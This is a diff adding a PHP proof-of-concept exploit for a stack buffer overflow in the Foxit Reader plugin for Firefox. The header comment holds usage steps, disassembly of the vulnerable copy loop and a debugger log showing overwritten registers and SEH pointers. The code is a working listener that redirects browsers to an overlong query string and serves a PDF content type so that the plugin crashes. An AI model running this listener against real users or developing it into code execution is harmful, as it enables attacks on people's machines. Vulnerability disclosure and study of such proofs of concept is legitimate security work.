@@ -1,0 +1,174 @@
+<?php
+/*
+Foxit Reader <= 5.4.4.1128 Plugin for Firefox npFoxitReaderPlugin.dll Overlong 
+Query String Remote Stack Buffer Overflow PoC --------------------------- rgod
+
+(listener)
+
+Tested against Microsoft Windows
+Mozilla Firefox 17.0.1
+Foxit Reader 5.4.3.0920
+Foxit Reader 5.4.4.1128
+
+File: npFoxitReaderPlugin.dll
+Version: 2.2.1.530
+
+Product url: http://www.foxitsoftware.com/downloads/
+Last version setup file: FoxitReader544.11281_enu_Setup.exe
+
+Usage:
+Launch from the command line, then browse port 6666 with Firefox.
+You can test it also through this url:
+
+http://192.168.0.1/x.pdf?[A x 1024]
+
+File must be existing or the server should be responding with
+the proper Content-Type header.
+
+vulnerable code, npFoxitReaderPlugin.dll:
+
+;------------------------------------------------------------------------------
+ L1000162F:
+  		push	ebx
+  		push	esi
+  		push	edi
+  		mov	edi,ebp
+  		or	ecx,FFFFFFFFh
+  		xor	eax,eax
+  		xor	ebx,ebx
+  		xor	esi,esi
+  		repne scasb
+  		not	ecx
+  		dec	ecx
+  		test	ecx,ecx
+  		jle	L100016E4
+ L1000164A:
+  		mov	al,[esi+ebp]
+  		mov	word ptr [esp+18h],0000h
+  		cmp	al,25h
+  		jz 	L10001661
+  		mov	ecx,[esp+1Ch]
+  		mov	[ebx+ecx],al
+  		jmp	L100016CE
+ L10001661:
+  		mov	al,[esi+ebp+01h]
+  		cmp	al,30h
+  		jl 	L1000166D
+  		cmp	al,39h
+  		jle	L1000167D
+ L1000166D:
+  		cmp	al,41h
+  		jl 	L10001675
+  		cmp	al,46h
+  		jle	L1000167D
+ L10001675:
+  		cmp	al,61h
+  		jl 	L100016C6
+  		cmp	al,66h
+  		jg 	L100016C6
+ L1000167D:
+  		mov	dl,[esi+ebp+01h]
+  		inc	esi
+  		inc	esi
+  		lea	ecx,[esp+10h]
+  		mov	[esp+18h],dl
+  		push	ecx
+  		mov	al,[esi+ebp]
+  		lea	edx,[esp+1Ch]
+  		push	L100450D4
+  		push	edx
+  		mov	[esp+25h],al
+  		call	SUB_L10006421
+  		mov	eax,[esp+1Ch]
+  		lea	ecx,[esp+24h]
+  		push	eax
+  		push	L100450D0
+  		push	ecx
+  		call	SUB_L100063CF
+  		mov	eax,[esp+34h]
+  		mov	dl,[esp+30h]
+  		add	esp,00000018h
+  		mov	[ebx+eax],dl
+  		jmp	L100016CE
+ L100016C6:
+  		mov	ecx,[esp+1Ch]
+  		mov	byte ptr [ebx+ecx],25h
+ L100016CE:
+  		inc	ebx
+  		mov	edi,ebp
+  		or	ecx,FFFFFFFFh
+  		xor	eax,eax
+  		inc	esi
+  		repne scasb
+  		not	ecx
+  		dec	ecx
+  		cmp	esi,ecx
+  		jl 	L1000164A
+ L100016E4:
+  		mov	edx,[esp+1Ch]
+  		pop	edi
+  		pop	esi
+  		mov	eax,00000001h
+  		mov	byte ptr [ebx+edx],00h
+  		pop	ebx
+  		pop	ebp
+  		pop	ecx
+  		retn
+;------------------------------------------------------------------------------
+
+this copy loop ends up in overwriting stack pointers, then 
+(by attaching to plugin-container.exe):
+
+(f48.1778): Access violation - code c0000005 (first chance)
+First chance exceptions are reported before any exception handling.
+This exception may be expected and handled.
+eax=0076ed4c ebx=00000341 ecx=002cf414 edx=002cf414 esi=41414141 edi=0076e9e8
+eip=10016852 esp=002cf3f8 ebp=75eacdf8 iopl=0         nv up ei pl nz na po nc
+cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+npFoxitReaderPlugin!NP_GetEntryPoints+0x15672:
+10016852 8906            mov     dword ptr [esi],eax  ds:0023:41414141=????????
+...
+Attempt to write to address 41414141
+...
+
+also SEH pointers are overwritten
+*/
+
+error_reporting(0);
+
+set_time_limit(0);
+
+$port = 6666;
+
+$____redirect = "HTTP/1.1 301 Moved Permanently\r\n".
+                "Server: Apache\r\n".
+                "Location: /x.pdf?".str_repeat("A",1024)."\r\n".
+                "Content-Type: text/html\r\n\r\n";
+
+$____boom     = "HTTP/1.1 200 OK\r\n".
+                "Server: Apache\r\n".
+                "Accept-Ranges: bytes\r\n".
+                "Content-Length: 60137\r\n".
+                "Content-Type: application/pdf\r\n".
+                "Connection: keep-alive\r\n\r\n";
+
+$socket = stream_socket_server("tcp://0.0.0.0:".$port, $errno, $errstr);
+
+if (!$socket) {
+  echo "$errstr ($errno)\n";
+} else {
+  echo "Listening on public tcp port ".$port." \n";  
+  while ($conn = stream_socket_accept($socket)) {
+    $line=fgets($conn);
+    echo $line."\n";
+    if (strpos($line,".pdf")){
+      fwrite($conn,$____boom);
+    }
+    else {
+      fwrite($conn,$____redirect);
+    }
+    fclose($conn);
+  }
+  fclose($socket);
+}
+?>
